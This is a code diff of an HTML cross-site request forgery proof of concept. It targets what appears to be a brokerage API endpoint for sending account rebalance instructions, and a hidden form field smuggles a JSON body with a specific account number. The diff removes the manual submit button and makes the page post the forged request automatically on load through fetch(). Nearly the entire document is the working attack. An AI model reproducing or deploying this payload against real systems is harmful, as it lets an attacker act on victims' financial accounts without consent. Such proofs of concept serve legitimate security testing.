@@ -10,41 +10,40 @@
 
 
 <html>
-  <body>
-    <form id="csrf" action="https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions" method="POST" enctype="application/json" onsubmit="submitForm(event)">
+  <body onload="submitForm()">
+    <form id="csrf" action="https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions" method="POST" enctype="application/json">
       <input type="hidden" name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}'>
-      <input type="submit" value="Submit">
     </form>
 
     <script>
-      function submitForm(event) {
-        event.preventDefault(); // Prevent the default form submission
+      function submitForm() {
+        var formData = new FormData(document.getElementById("csrf"));
 
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions", true);
-
-        // Add custom headers
-        xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.setRequestHeader("Your-Custom-Header", "Header-Value");
-
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState == 4) {
-            if (xhr.status == 200) {
-              // Handle the successful response here if needed
-              console.log(xhr.responseText);
-            } else {
-              // Handle errors here
-              console.error("Error: " + xhr.status);
-            }
-          }
+        // Construct the fetch options
+        var fetchOptions = {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Your-Custom-Header': 'Header-Value'
+          },
+          body: formData
         };
 
-        // Get the form data and send as JSON string
-        var formData = document.querySelector('#csrf input[name]').value;
-        xhr.send(formData);
+        // Make the fetch request
+        fetch("https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions", fetchOptions)
+          .then(response => response.json())
+          .then(data => {
+            // Handle the response data if needed
+            console.log(data);
+          })
+          .catch(error => {
+            // Handle errors here
+            console.error('Error:', error);
+          });
       }
     </script>
   </body>
 </html>
+
 
 
